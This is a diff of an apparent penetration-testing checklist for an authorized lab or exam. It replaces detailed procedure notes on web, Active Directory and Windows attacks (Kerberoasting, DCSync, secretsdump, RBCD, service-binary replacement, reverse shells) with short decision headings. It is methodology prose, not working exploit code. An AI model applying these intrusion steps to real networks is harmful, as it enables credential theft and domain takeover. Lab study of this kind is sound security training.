-rmdir -- './web-context-<same-run-id>'
-```
+## AD-08. What decides this step?
 
-Missing files or retained evidence can make `rm`/`rmdir` report errors. Inspect;
-do not replace this with recursive deletion or claim all local copies vanished.
-Record unresolved remote session/artifact state at the source step's cleanup.
+The hashcat mode depends on the captured Kerberos prefix.
 
-## WEB-10 Inspect a normal file upload
+## AD-09. What decides this step?
 
-Use a harmless accepted file. Record the request field, original filename, declared content type, returned filename or identifier and retrieval location. Preserve required session and form fields. Retrieve through the normal UI and compare the returned body and content type. A success banner without a retrievable file leaves storage unconfirmed; a renamed file is a separate observation. Record any accepted test artifact for cleanup through the normal application controls.
+Graph edges are candidates until source, membership, target and right match.
 
-URL context: Exact upload request URL observed in Network. Example: http://192.0.2.10:8080/api/upload. Do not substitute the form-display page unless it is also the receiving endpoint.
+## AD-10. What decides this step?
 
-Existing-file editor access needs its own preservation and restoration. WEDIT-01
-keeps exact selected theme/file context and disables proof self-deletion; editor
-source equality does not establish filesystem metadata or a root identity.
+A LAPS value is scoped to one computer and account.
 
-Content-Type and Content-Disposition help explain client handling but do not
-prove an interpreter ran. Source served as text, a download and a blank rendering
-all need their own observation. Execution requires an attributable result from
-the deliberately selected proof, not a guessed handler based on an extension.
-Status alone also cannot establish record deletion or remote-file absence.
+## AD-11. What decides this step?
 
-## WEB-11 Scan the identified CMS
+Replication rights return material; they do not open a shell.
 
-Run one scanner for the CMS already indicated by page, asset or metadata evidence. Record the scanner version, installation base and every observed component path. Treat a scanner version as a candidate until a public file, asset or administrative view confirms it. WPScan's ap and at modes are slower but closer to the command-level coverage in your original; mixed plugin detection makes active requests, while --no-update avoids a runtime update. Droopescan is also active and may send thousands of requests. Eight threads is a deliberate starting point; reduce it when the application becomes unstable. Correlate exact versions manually. Do not enable password guessing, automatic exploitation, online API calls or unreviewed inherited configuration.
+## AD-12. What decides this step?
 
-URL context: CMS installation base URL, including http:// or https://, hostname or TARGET_IP, optional port and any nested directory. Example: http://192.0.2.10:8080/blog/. Do not use a login page or individual content URL as the base.
+WinRM is its own login path and needs its own host.
 
-### WordPress
+## AD-13. What decides this step?
 
-Run the first command for local inventory without API vulnerability data. Add the optional API command only when internet use and sending detected component identifiers to WPScan are acceptable. The token retrieves vulnerability records; it does not improve component detection. Free-tier quotas can run out, after which enumeration continues without vulnerability data. Never paste a real token into notes, screenshots or reports. Review core version, main theme, users, plugins, themes, config backups and interesting findings. ap and at can take time. If WPScan misses an observed component, confirm its public asset path and search it separately. With an existing authorized admin session, Tools > Site Health > Info gives a stronger installed-component inventory.
+An existing admin indication avoids repeating the SMB login.
 
-### Drupal
+## AD-14. What decides this step?
 
-Review possible core versions, modules, themes and interesting URLs. Check reported README or changelog paths directly. With authorized admin access, Reports > Status report, Extend and Appearance provide stronger version and enabled-component evidence.
+Collection is valid only after same-host admin proof.
 
-### Joomla
+## WIN-01. What decides this step?
 
-Droopescan documents only version and interesting-URL support for Joomla. Fetch reported manifests or README files directly. Do not treat an empty scan as an extension inventory. With authorized admin access, use System Information and installed extensions views.
+Host and token, not the username, decide the next branch.
 
-### SilverStripe
+## WIN-16. What decides this step?
 
-Review possible core versions, modules, themes and interesting URLs. Confirm each useful path directly and retain uncertainty about custom or newer components missing from Droopescan's database.
+One non-standard path at a time; no drive recursion.
 
-### Moodle
+## WIN-02. What decides this step?
 
-Droopescan explicitly describes Moodle plugin and theme coverage as very limited. Use its version and interesting-path leads, then inspect public plugin/theme assets and any authorized Site administration pages. An empty result establishes nothing.
+Native checks or one reviewed scanner, then one path at a time.
 
-### Other or unknown CMS
+## WIN-03. What decides this step?
 
-For CMS Made Simple, other products or a custom application, record visible branding and the evidence behind any fingerprint. If already authorized, inspect the existing About/System and component screens. No dedicated scanner coverage is claimed. If evidence conflicts, leave the product unconfirmed.
+Credential Manager, history and saved targets are bounded reads.
 
-### Droopescan limits
+## WIN-13. What decides this step?
 
-Check droopescan stats before relying on its database for a modern release. The project warns that supported versions and component lists can lag. Joomla support is narrow and Moodle component coverage is very limited.
+Build and feature checks gate a patch candidate.
 
-The title query uses separate product/version terms. SearchSploit's default
-version-range matching can return broader candidates; exact-title matching can
-also miss a legitimate differently worded title. Read the source's actual
-affected range and feature instead of treating the query as a version verdict.
-The path option can copy a path to the local clipboard; it does not execute the
-exploit. Missing index entries and stale local content remain unknown coverage.
-See the [upstream SearchSploit manual](https://www.exploit-db.com/searchsploit).
-This supplements the maintained CMS inventory; it does not remove its commands,
-require every scanner or fetch vulnerability intelligence at runtime.
+## WIN-14. What decides this step?
 
-## WEB-12 Check default files software and WebDAV
+Stage the reviewed build with a hash check before executing.
 
-OPTIONS is capability discovery only. A public 200 does not validate credentials or write access. PROPFIND 207 shows collection behavior at the requested URL; 401 or 403 still preserves the WWW-Authenticate challenge and access boundary. Do not send PUT during discovery. If later AD evidence supplies one credential, continue in AD-15, which selects Basic or NTLM from the challenge and separately proves listing and write access. Tuning 2 selects misconfiguration/default-file checks and b selects software identification. This narrows the unrestricted Nikto invocation; it is not full vulnerability coverage. OffSec names Nikto among permitted examples, but restricted functions remain restricted regardless of tool. Defer repeated errors or unsupported banners; choose another observed service when this origin has no concrete unanswered lead.
+## WIN-04. What decides this step?
 
-URL context: Origin of the web service: scheme, hostname or TARGET_IP, and optional port. Example: http://192.0.2.10:8080. Keep an observed virtual-host name when required.
+Service replacement needs a hash-checked backup and an immediate restore.
 
-The retained module's capability, authentication and write-access distinctions
-still apply. Curl has no fixed total-request timeout in these working examples.
+## WIN-05. What decides this step?
 
-## AD-01 Identify the domain and controller
+The scheduled variant adds a trigger, not a different recovery rule.
 
-SMB commonly reveals the host and domain even without credentials. LDAP base output can expose the default naming context and controller hostname. Keep the DNS domain, NetBIOS domain and controller hostname distinct. Add only an observed in-scope name to local resolution. Kerberos failures can be caused by bad name resolution or clock skew even when the credential is correct; compare the failure stage before changing the password. Do not infer that a related or trusted domain is in scope.
+## WIN-06. What decides this step?
 
-## AD-02 Check anonymous SMB RPC and LDAP
+A version matters only with a consumer and an execution context.
 
-Run these after AD-01 so BASE_DN is derived from the observed domain, for example DC=corp,DC=local. Anonymous SMB listing, null-session RPC and anonymous LDAP are independent; one denial does not predict the others. An anonymous-login message followed by no shares means authentication worked but exposed no shares. Ignore a later SMB1 fallback error when the preceding SMB2/3 result is already clear. When RPC works but LDAP is denied, querydispinfo can expose account descriptions and operational notes; use queryuser only for one RID justified by that output. Description, info and comment are mandatory high-signal LDAP fields. Keep every value tied to its account and source field, and never report a password-looking string as valid before AD-03 succeeds. Keep disabled, machine and user accounts distinguishable. Use USER_FILE once in AD-07; do not turn it into a password spray.
+## WIN-07. What decides this step?
 
-SMB share listing, RPC directory metadata and LDAP reads have different access
-controls. Three denials close three anonymous reads, not the authenticated AD
-route. A web form on an already observed service remains a separate lead.
+Both AlwaysInstallElevated hives must be `1`.
 
-## AD-03 Validate one supplied credential
+## WIN-08. What decides this step?
 
-This is a single-host credential check, not a spray. A success applies only to the protocol and host tested. Preserve whether the account was domain or local. NetExec documents [+] as authentication success and (Pwn3d!) as likely SMB code-execution access, commonly local administrators membership. Never interpret an account name or recovered string as valid until a bounded check succeeds. A password on the command line can enter shell history and process listings; use a protected lab terminal and do not copy it into reusable notes or screenshots.
+`SeImpersonatePrivilege` plus a reviewed tool and a live spooler.
 
-the changed-context check records the changed context before choosing one old question. This
-prevents a service denial from being forgotten while avoiding repeated attempts
-with unchanged inputs. Local and domain accounts with the same name are not the
-same identity. A protocol success does not prove another protocol accepts the
-credential, nor does it authorize new targets or password guessing.
+## WIN-15. What decides this step?
 
-## AD-04 Read accessible shares
+One staged artifact, one attempt, reset afterwards.
 
-Use either the plaintext or NT-hash form that matches the current identity. Start with unfiltered --shares because an empty permission-filtered view can be ambiguous. Read the Permissions column, then prioritize custom names that suggest backups, audits, credentials, deployment, scripts, administration or archives. In smbclient use ls, cd and get for files justified by the listing; avoid mget * unless the directory is small and every file is relevant. Record which identity could read or write each share. A writable share matters only when a known consumer uses a specific path. Re-run this task when the identity changes and compare access with the previous identity.
+## AD-15. What decides this step?
 
-The share permission column is a lead. It does not identify a privileged file
-consumer. Hash only a file actually copied for this question, and retain the
-exact remote source with the local artifact. A partial `smbclient` transfer is
-not a complete file.
+WebDAV needs an authenticated listing and a fresh filename before upload.
 
-## AD-21 Extract one offline directory backup
+## AD-16. What decides this step?
 
-This is offline analysis of two files already readable through the authorized share; it is not a live DCSync request. Stop unless the ntds.dit and SYSTEM hive are from the same backup set. A SECURITY hive can support separate local-secret analysis but is not required for the domain-hash extraction shown here. NTDS_FILE and SYSTEM_FILE are protected local copies outside source control. Preserve their original remote paths, sizes and SHA256 values. secretsdump output can include disabled, stale, service and machine accounts; recovery does not prove current validity or privilege. Keep hashes out of screenshots, reports and reusable notes. Validate only one evidence-backed account through AD-03, then re-run AD-04 if the identity changes.
+RBCD is safe only from an empty baseline with both cleanup steps.
 
-## AD-05 Inventory domain users and computers
+## AD-17. What decides this step?
 
-Choose one authentication form for the current identity. GetADUsers -all includes accounts without email and disabled accounts, so keep status and account type clear. For every useful computer, retain sAMAccountName, dNSHostName and operating system; exact FQDNs matter to Kerberos and later host access. Preserve the collection identity and controller. Large or partial output can hide omissions; do not label the domain fully enumerated. If LDAP signing or transport prevents the query, record the exact error and use the current course-supported LDAP path rather than repeatedly changing credentials.
+A gMSA value still needs its own service login.
 
-## AD-06 Check SYSVOL for legacy GPP credentials
+## AD-18. What decides this step?
 
-Choose the plaintext or NT-hash form that matches the current identity. This command searches Group Policy Preferences XML and decrypts cpassword values when exposed. It does not establish that the recovered account is enabled, privileged or reused. Keep the source policy path with the credential observation and protect the value. If the tool fails to reach the share, resolve DC_HOST, confirm SMB access and read the error before changing options. Do not keep querying once the policy shares have been examined under the current identity.
+GPO edits need a fresh backup and a restore check.
 
-The alternate route applies only after the same policy shares have been
-reviewed under the same identity. A changed identity or specific new policy
-file can justify a distinct check.
+## WIN-09. What decides this step?
 
-## AD-07 Request eligible Kerberos material
+Utilman replacement is recoverable only with a backup and trusted RDP.
 
-GetNPUsers can run before a credential exists when AD-02 produced a valid USER_FILE. Run it once for that username set, and repeat only when a materially different set is recovered. GetUserSPNs uses either the valid plaintext or NT-hash identity to query user-linked service principal names and request tickets. These are distinct questions, but both produce offline crack candidates. Preserve the account name and encryption type with each hash. Do not add username generation, password spraying or repeated bulk requests. If the domain name cannot resolve, keep TARGET_IP as the controller address and fix the observed DC_HOST mapping before switching to Kerberos authentication.
+## WIN-10. What decides this step?
 
-AS-REP and service-ticket requests have different prerequisites and hashcat
-modes. An empty file can mean no eligible account, denial or collection error;
-inspect the exact output before choosing the next route. A fresh directory
-prevents accidental replacement of another lab's hash file.
+RunasCs needs one validated plaintext identity.
 
-## AD-08 Crack Kerberos candidates offline
+## WIN-11. What decides this step?
 
-The displayed defaults are etype 23: mode 18200 for AS-REP and 13100 for TGS-REP. Match the prefix before running: AS-REP etype 17 uses 32100 and etype 18 uses 32200; TGS-REP etype 17 uses 19600 and etype 18 uses 19700. Hashcat documents that parser or line-length errors commonly mean the wrong mode. Cracking is offline and may take time; run the matching file once, record whether it completed, and move to another active lead rather than endlessly expanding lists. A recovered value remains sensitive and unvalidated until the bounded authentication check succeeds.
+SeManageVolume needs the DLL backup and a broad-ACL reset.
 
-The commands select the known etype-23 AS-REP or service-ticket format only.
-Other enctypes need their own verified mode. Exhausting rockyou says nothing
-about passwords outside that local candidate set.
+## AD-19. What decides this step?
 
-## AD-09 Collect and read the domain graph
+Group membership and password reset are separate object rights.
 
-Choose the plaintext or NT-hash collection form that matches the current identity. Use the final three commands only when collection cannot find a controller: verify the current hostname mapping, query the DC locator SRV record against the assigned DNS server, then retry with that server selected. OffSec currently names BloodHound Legacy/CE and SharpHound as allowed examples, but functionality still controls. NetExec's current collector defaults to CE; verify your installed edition and import into the matching interface. Run collection once per materially changed identity, not in a loop. Mark the current principal Owned, open Outbound Object Control first, and record the exact source, target and edge such as GenericAll, GenericWrite, WriteDACL, WriteOwner, AddAllowedToAct, AdminTo or CanPSRemote. Target visibility without an exact edge is not a route. Verify the edge prerequisites before choosing a checklist branch. If an expected edge is absent, check the owned marker, collection method, hostname resolution, current identity and timestamp; collect again only when one of those facts changed.
+## WIN-12. What decides this step?
 
-An imported graph can be stale or incomplete. The authenticated principal,
-full membership chain and target object must match before a right-specific
-procedure opens. `/etc/hosts` cannot supply an SRV answer. Use the explicit
-DNS retry only after the locator failure, never as a second routine pass.
+A loopback tunnel forwards one port; it does not grant scope.
 
-## AD-10 Read LAPS only when the graph grants it
+## AD-20. What decides this step?
 
-Use the direct LDAP command when legacy LAPS evidence is needed without a graph; it queries one exact computer rather than dumping every readable password. TARGET_HOST is the observed computer name and TARGET_COMPUTER is its sAMAccountName without the dollar sign. Current Impacket can query that specific computer and prompts for the domain password. Keep the attribute, computer, returned account, source relationship and retrieval time together. Most member hosts use a managed local account and require --local-auth. A domain controller has no ordinary local SAM account, so do not force --local-auth there; use the domain branch only when separate lab evidence identifies MANAGED_ACCOUNT as the domain account controlled by the returned secret. A password value alone does not establish that account mapping. A blank or denied result may mean the right is absent, the target name is wrong, LDAPS is required or the attribute is not readable. Open only the branch whose validation reports (Pwn3d!), and never assume reuse on another host.
+One MSSQLSvc ticket through the live tunnel answers only the SQL login.
 
-Legacy LAPS and newer managed-account output differ. A password on one
-computer does not establish a domain credential or admin on another host.
-`(Pwn3d!)` remains a same-host tool indication until the new shell is verified.
+## REDIS-01. What decides this step?
 
-## AD-11 DCSync one account only with replication rights
+`PONG` is access; `NOAUTH` without a credential ends the branch.
 
-The relevant BloodHound relationship normally includes GetChanges and GetChangesAll on the domain object; verify the source principal and current collection before proceeding. -just-dc-user limits the DRSUAPI request to one named account and implies the domain-only mode. Do not substitute a full domain dump. This is a high-impact action: run it only in the assigned lab or exam scope, preserve the exact prerequisite evidence and avoid exposing returned material in screenshots or reusable documents.
+## REDIS-02. What decides this step?
 
-## AD-12 Open WinRM only after access validates
+`INFO` and the persistence path are context, not execution.
 
-Use the resolved hostname when Kerberos or certificate behavior requires it; an IP can work for ordinary NTLM. NetExec's WinRM result is the gate for the second command, not a reason to open sessions across the domain. Evil-WinRM can prompt when -p is omitted if you want to reduce command-line exposure. Keep the authenticated identity and host with the shell. Do not enable WinRM or RDP as part of the checklist.
+## REDIS-03. What decides this step?
 
-The optional `nxc` check distinguishes an authentication result from WinRM
-shell authorization after an ambiguous failure. It is not a mandatory preflight
-for a permitted credential. Keep local and domain identities separate.
+A module or replication candidate must match the live commands.
 
-## AD-13 Use SMB admin access on one host
+## REDIS-04. What decides this step?
 
-PsExec creates a temporary service and requires the matching administrative SMB access. Prefer WinRM through AD-12 when it is already available and sufficient. If endpoint controls block PsExec, do not cycle through execution methods blindly; record the blocked method and use another relationship justified by the current evidence. Never run the command against a list or subnet. Confirm the shell identity immediately.
+`system.exec` output on the assigned host is execution; a socket shell is separate.
 
-`(Pwn3d!)` is a tool indication tied to one host and identity. The new shell's
-native hostname and token are separate observations. PsExec may create a
-temporary service or file; record its exact effect and recovery status rather
-than assuming tool exit proves cleanup.
+## REXP-01. What decides this step?
 
-## AD-14 Collect member-host secrets after admin access
+Rogue replication replaces data, so the lab needs a reset route.
 
-Use this only on the confirmed member host, not the domain controller. Impacket may temporarily start Remote Registry and states that it restores the original state; record any failure or cleanup warning. The Mimikatz alternative requires an already elevated local shell, a reviewed binary and the required token; modern protections can block it. Do not disable protections or add an evasion path. Local SAM hashes require --local-auth and the exact local username. Open the local PsExec shell only after (Pwn3d!). Cached or LSA material can be stale. Store outputs in protected lab evidence and avoid a broad reuse sweep. For a controller replication relationship use the single-account AD-11 path instead.
+## REXP-02. What decides this step?
 
-`secretsdump` and a reviewed in-shell collector are different access contexts.
-A returned hash is protected material; a same-host authentication result is a
-separate fact. The shell transition is already authored at AD-13.
+The tool prompt proves nothing until `id` returns.
 
-## WIN-01 Capture the current Windows context
+## REXP-03. What decides this step?
 
-The token, not the username alone, controls the current process. Distinguish local and domain identity, group membership, enabled privileges and an elevated token. systeminfo supplies the build, a hotfix summary, domain membership or WORKGROUP, and operating-system architecture, but does not prove exploitability. A build-dependent candidate enters WIN-13 without skipping the ordinary WIN-02 checks; compare the verified options and prefer a less disruptive path over an unstable kernel path. When payload or transferred-tool compatibility depends on it, record process architecture separately; CPU capability alone does not determine the correct payload architecture. ipconfig can reveal additional assigned networks or DNS context; it does not grant scope. klist shows current tickets and their service names. Correlate the hostname with the assigned target and preserve the exact shell identity before interpreting later access. Do not run local privilege-escalation enumeration after NT AUTHORITY\SYSTEM unless an assigned objective requires a different context.
+Restore the filename, module and replication role from the recorded baseline.
 
-The objective is exercise-specific. the exact objective proof makes proof attributable to its host,
-identity and objective; keep the evidence complete and local. The working
-route replaces the stale GAP-EVIDENCE handoff, not the retained runtime definition.
-Do not collect an unrelated domain secret merely because a member-host objective
-is met or the current token is SYSTEM. The selected working body asks for host
-and full token first. OS build, adapter detail and Kerberos tickets are separate
-questions; the original seven-command inventory remains source history, not a
-required every-shell pass.
+## REXP-04. What decides this step?
 
-## WIN-16 Inspect one non-standard root path
+The RDB include works only with a proven PHP include and a writable web directory.
 
-This is a short discovery pass for custom roots such as application, maintenance, backup, deploy, scripts or tools directories. Do not assume that a custom directory is vulnerable. Read filenames first, then open only a small relevant note, configuration or script. Preserve the exact path and the statement that identifies a consumer. Executables without a consumer are inventory, not escalation. If a consumed file becomes a lead, check both its file and parent-directory ACL and confirm any group permission against the current token in WIN-04 or WIN-05.
+## SSH-03. What decides this step?
 
-The current foothold may already name a custom root or consumed script; using
-that exact path avoids a redundant drive inventory. A top-level listing is a
-fallback for an otherwise unknown path, not a recursive search. `-Force`
-includes hidden entries but does not bypass ACLs. A selected file can contain
-sensitive data; keep its output in private adventure custody and request a
-later range only for a specific unanswered question. No file is modified.
+A knock sequence is used only from recorded configuration and is closed afterwards.
 
-## WIN-02 Run WinPEAS once then verify leads manually
+## WPRIV-01. What decides this step?
 
-Use a locally reviewed WinPEAS build transferred through an authorized method. Record its version or hash. Antivirus alerts and partial output are possible; do not disable protections or use evasion from this checklist. If it cannot run, the native fallbacks still expose service and task candidates. The filtered task view is navigation only; it can omit context and does not prove that no hidden or privileged task exists. Use the full listing or exact-task query for evidence. Read the output around each lead and confirm it with the targeted commands below. A colored warning is not a vulnerability. Delete the transferred tool and output when the exercise requires cleanup and the evidence is safely retained.
+AlwaysInstallElevated plus an MSI gives the installer's token.
 
-WinPEAS can be unavailable, blocked or incomplete. Native service, task,
-identity and startup output provides enough context to choose one targeted
-check, but it does not prove that a file is writable, consumed by a privileged
-identity or safe to execute. The selected working body prints to the current
-terminal and creates no default transcript. The earlier source's `Tee-Object`
-file path could overwrite an existing `winpeas.txt`; its retained source and
-notes are historical, not the selected working command. If a raw capture is
-required, create a separately reviewed private evidence artifact without
-overwriting an existing one. Keep custody in private adventure evidence and use the chosen tool's own
-cleanup; neither scanner output nor a saved file proves a finding. See the
-[Windows PowerShell 5.1 `Tee-Object` syntax](https://learn.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/tee-object?view=powershell-5.1),
-which has no `-NoClobber` option.
+## DNS-01. What decides this step?
 
-## WIN-03 Check saved credentials history and user files
+A DNS answer can be negative; `REFUSED` is not absence.
 
-cmdkey usually lists target names, not plaintext passwords. History can reveal past commands, paths and account names but may be absent or belong to another shell host. Start with the three user folders and inspect only files whose names or context justify it. Avoid recursive searches across C:\ by default. Keep secrets and private file content in protected adventure notes, not in the reusable checklist. Recovered domain credentials return to AD-03; application credentials return to the relevant service check.
+## DNS-02. What decides this step?
 
-Credential Manager and RDP files can identify a host, user, protected reference,
-and custody metadata without exposing a usable password. Source, owner,
-timestamps, ACLs, and host relationships are evidence; stale targets and local
-accounts can look plausible. This supplement deliberately stops before
-decryption, export, or authentication and preserves the original WIN-03 route.
-The selected history check limits displayed lines, not the sensitivity of those
-lines; it is optional and belongs only in the operator's private session.
+The name is tested against the assigned IP before it is trusted.
 
-## WIN-13 Confirm one patch-dependent Windows LPE candidate
+## DNS-03. What decides this step?
 
-Treat the product name or major build as a lead, not a vulnerability. Compare CurrentBuildNumber plus UBR with the advisory's affected and fixed revision ranges. Get-HotFix is supporting inventory from Win32_QuickFixEngineering; it can omit updates and does not make the absence of one original KB conclusive. Later cumulative updates can supersede the named fix. Query only a service or feature required by the selected exploit. Record whether it exists and is running without starting or reconfiguring it. Stop when the edition, revision, architecture, service, feature or other exploit prerequisite differs. A confirmed candidate joins the lead queue; it does not outrank a safer service, task, token or policy path automatically.
+AXFR runs only for an authorized zone.
 
-When a candidate explicitly depends on OS architecture, inspect that one
-field:
+## NFS-01. What decides this step?
 
-```powershell
-Get-CimInstance Win32_OperatingSystem | Select-Object OSArchitecture
-```
+The export listing states client restrictions, not read access.
 
-When it depends on a named service, check that exact service:
+## NFS-02. What decides this step?
 
-```powershell
-sc.exe query '<exact-required-service-name>'
-```
+A read-only mount can still show permissions and content.
 
-If the reviewed advisory identifies a specific fixing KB and the exact UBR
-still leaves a question, use `Get-HotFix` to investigate that KB. Do not sort
-and inspect the entire hotfix list for every candidate; cumulative updates can
-supersede an individual entry. Keep the advisory version and observed host
-context with the decision. No target file or setting changes in this step.
+## NFS-03. What decides this step?
 
-## WIN-14 Prepare and transfer one reviewed Windows PoC
-
-Record the source locator, pinned commit or version, original SHA256, target architecture, upstream toolchain, dependencies, exact build command, derivative diff, output SHA256 and intended behavior in protected lab notes. Do not treat a compiler failure as target evidence. Prefer the toolchain named by the project. An isolated VM or container can be a build environment, but it is not part of the target path. Do not delete conflicting definitions or change exploit logic merely to make an old PoC compile. BUILD_OUTPUT is the completed local PE and PAYLOAD_FILE is that file's basename in the serving directory. Bind the temporary server only to the assigned lab interface. EXPECTED_HASH is the uppercase or lowercase SHA256 hex digest from the local build; PowerShell's comparison is case-insensitive. Keep the transferred file at a separate staging path and remove it after the objective when evidence retention permits.
-
-The source candidate, edited derivative, compiled PE and Windows stage have
-different hashes and purposes. A compiler may overwrite a named output, so
-choose a fresh private build path and verify its result before serving it.
-The target-side download is not an atomic exclusive-create operation; use a
-new operator-owned private directory without a competing writer. After any
-failed transfer, inspect only this run's stage and remove it through explicit
-custody. No target process is started by this preparation step.
-
-## WIN-04 Complete a service-binary permission path
-
-The complete gate is a writable exact executable, a higher-privileged service account and a usable stop/start condition. An unquoted path alone is not enough. FILE_PATH is the executable named by BINARY_PATH_NAME; check the file and parent directory. If write access comes from a group ACE, confirm that group in the current token; (F), (M) or (W) is actionable only for the current user or one of its groups, and (I) means inherited. BACKUP_PATH must be a new path on the same host. Stop unless its size and SHA256 match the original. Generate the payload outside the repository, record its Kali hash, serve only its directory, and compare the Windows hash before replacement. Keep the original foothold open and use it for restoration after the new callback arrives. Run the listener in a separate Kali terminal before the service trigger. If stop/start is denied but the verified service is automatic, a disposable lab reboot may be the trigger; do not reboot a production-like host or guess. The callback identity and hostname, not an assumed SYSTEM account or tool success text, prove the transition. Restore from the exact backup as soon as the callback is retained. If restoration fails, preserve the error and reset the disposable lab.
-
-The retained source's Force example cannot enforce its new-backup prerequisite.
-The selected working body uses File.Copy with overwrite false, so a file appearing after
-Test-Path also causes refusal. This protects the destination file, not against
-all parent-directory races or concurrent changes to the original. Use a private
-controlled directory and preserve uncertainty; hashes do not prove ACL recovery.
-
-## WIN-05 Complete a scheduled-binary permission path
-
-When readable, inspect Task To Run, Run As User, State, Last Run Result and Next Run Time together. If task query is denied, continue only when a local note, configuration or script names the exact recurring executable and expected interval or trigger; a filtered task listing is not complete evidence. Confirm the file, parent directory and any group ACE against whoami /groups. The current identity needs (F), (M) or (W); (I) marks inheritance. Do not assume the hidden consumer runs as SYSTEM. BACKUP_PATH must be new and match the original in size and SHA256; the backup command fails rather than overwriting an existing path. Keep the original foothold open for restoration. Record the Kali payload hash and compare the staged Windows hash before replacement. Start the listener first. Use schtasks /run only when the exact task is known and the current identity is allowed; otherwise wait for the evidenced interval. Disabled, stale or weakly inferred consumers remain unresolved. Trust the callback's whoami /all and hostname, not tool text. Restore immediately; if cleanup fails, preserve the error and reset the disposable lab.
-
-The backup block creates only a recovery copy, without executing either binary
-or task. The full selected procedure is independently substitutable and does
-not depend on WIN-04 variables. Original task/path/account evidence and exact
-restoration remain mandatory. The transfer and staging steps need fresh private
-paths; an existing destination or hash mismatch stops the attempt.
-
-## WIN-06 Confirm an application or autorun lead
-
-Installed-application records can be incomplete, duplicated across 32-bit and 64-bit registry views or left behind after uninstall. Startup entries may run only for the current user. Confirm the binary on disk, its owner and its execution context before researching a version or permission issue. Avoid downloading or running public exploit code until the exact product, version, architecture, prerequisite and scope have been reviewed. Keep a blocked lead distinct from a disproven one.
-
-Uninstall metadata can be stale, duplicated between registry views or unrelated
-to the process that actually runs. Startup entries can be user-scoped, and a
-writable file matters only when a privileged consumer reads or executes that
-exact path. The supplement therefore records one observed product/path, checks
-both relevant startup roots and compares file and parent-directory ACLs without
-launching or modifying the application.
-
-## WIN-07 Confirm AlwaysInstallElevated
-
-The machine and current-user policies must both enable AlwaysInstallElevated. One value alone is not sufficient. This checklist intentionally does not generate a payload or install an MSI automatically. If the lab path requires it, use the current PEN-200 procedure with an operator-reviewed artifact, document what will change, and clean it up. A successful installer message is not proof of the final identity.
-
-AlwaysInstallElevated is a two-hive gate: one enabled value is insufficient,
-and a registry read failure is not evidence that the value is disabled. This
-working branch intentionally stops at prerequisite recording and sends any
-later MSI activity to a separately reviewed, operator-controlled procedure.
-
-## WIN-08 Use PrintSpoofer only with SeImpersonate
-
-The upstream path requires enabled SeImpersonatePrivilege, compatible architecture and the spooler mechanism already in the required state. Query the spooler but do not start or reconfigure it merely to make the path work. Acquire the binary from a pinned reviewed source outside the timed exercise when practical, record its local SHA256 and transfer it through the same bounded serve, staging and hash-comparison procedure used in WIN-04. EXPECTED_HASH is that source digest. Endpoint protection or spooler state may block the path; do not disable protections or cycle through named-pipe tools blindly. Trust the new process token, not CreateProcess success text. A controller machine-account token may have useful rights but must remain labeled with its exact identity and access. If the objective requires SYSTEM, continue another justified route. Remove the transferred file when cleanup is required.
-
-This selected working body expects one already reviewed, exact local binary.
-It does not choose a build, transfer it, alter the spooler or bypass endpoint
-protection. The current enabled privilege, tool architecture, spooler state and
-source hash are separate gates. The `-i -c` options are part of the reviewed
-tool's child-process operation; they do not make every attempt appropriate.
-Confirm host and effective token inside that child. Delete only a file staged
-for this attempt, and only after the child and tool no longer use it. A failed
-delete is an unresolved custody result, not proof that the file is absent.
-
-## WIN-15 Attempt one unstable Windows LPE on a disposable host
-
-Kernel-memory and similarly unstable exploits can leave token or kernel state changed even when their final step fails. Do not rerun against that uncertain state. Keep the original foothold open when practical, record the exact artifact hash and invocation, and execute one reviewed trigger from a clean disposable lab state. A callback payload requires its listener first. A local-shell or other payload requires its own expected observation point instead, not an irrelevant listener. Verify identity in the process created by the exploit and correlate its hostname with the assigned target. Remove only the staged artifact after retaining required evidence. If the host cannot be reset or reverted, or the artifact and prerequisites no longer match, stop this branch.
-
-An unstable local privilege attempt may alter state even when a callback
-arrives. Its verification and the disposable-host reset are separate facts.
-Retain the actual target snapshot/reset identifier privately before the
-attempt. Stop only processes and remove only files created for this run. Do not
-erase the original reviewed source or a pre-existing target artifact. A new
-attempt requires a fresh decision after verified recovery.
-
-## AD-15 Use an authenticated WebDAV write path
-
-TARGET_URL is the exact WebDAV collection URL with scheme, host, port and application path but no trailing slash. Inspect WWW-Authenticate: Basic, NTLM and Negotiate are different paths. Curl --anyauth chooses a scheme the installed build supports and prompts because -u omits the password. A 401 means authentication or scheme failure; 403 usually means the authenticated identity lacks access. Do not confuse a public OPTIONS 200 with credential success, or a PROPFIND 207 with write access. Use the packaged reviewed webdav_request.py only when curl lacks the offered Basic or NTLM feature, and choose exactly one fallback PROPFIND command. The Basic example requires an explicit cleartext override because TARGET_URL is HTTP; omit it on HTTPS. For later helper requests, change the method to PUT, GET or DELETE and use --file only for PUT. The helper never follows redirects and bounds displayed output. The msfvenom payload is a non-Meterpreter reverse shell; match target architecture. Start the listener before one GET trigger. A failed trigger does not erase proven write evidence. DELETE is cleanup after the callback or a closed branch. Return to the HTTP checklist for path discovery, virtual hosts or non-WebDAV upload behavior.
-
-An authenticated `207` proves listing, a `201` or `204` proves a write, and an
-observed exact path proves storage. Only an attributed callback plus native
-host/token check establishes a usable foothold. The prior OPTIONS check merely
-repeated capability discovery already evidenced at entry. Basic or NTLM
-fallback needs the server's actual challenge and a separately reviewed client
-choice; do not downgrade transport to make one branch work.
-
-## AD-16 Use RBCD only from verified computer control
-
-This branch makes two directory changes and is for an assigned lab or exam target only. Use only one plaintext or NT-hash alternative at each labeled step. TARGET_COMPUTER is the target computer sAMAccountName without the trailing dollar sign; TARGET_HOST is its exact resolvable FQDN. The complete prerequisite gate is the exact target computer, an exact GenericAll, GenericWrite, WriteDACL or AddAllowedToAct edge from the owned identity, MachineAccountQuota above zero, and a recorded allowed-to-act baseline. CONTROLLED_COMPUTER must be a unique lab-only name without the trailing dollar sign, and CONTROLLED_PASSWORD must be a new strong value stored only in protected notes. Verify the new computer appears before writing. Verify the write by re-reading the attribute and confirm only the expected controlled computer was added. getST may print that no ccache was found before later saving a new ticket; success requires the final Saving ticket message and the exact file on disk. Set CCACHE_FILE to that generated filename, keep KRB5CCNAME in the same shell as PsExec, and use klist from a locally prepared krb5-user package to confirm cifs/TARGET_HOST in the expected realm. Service-creation text is not shell proof; run whoami /all and hostname in the new process. Cleanup uses -action remove for only the controlled computer's delegation ACE; never use flush. Delete only the computer created here, then re-read RBCD and compare it with the baseline to verify cleanup. Preserve failed cleanup output and reset the lab if either change cannot be reversed.
-
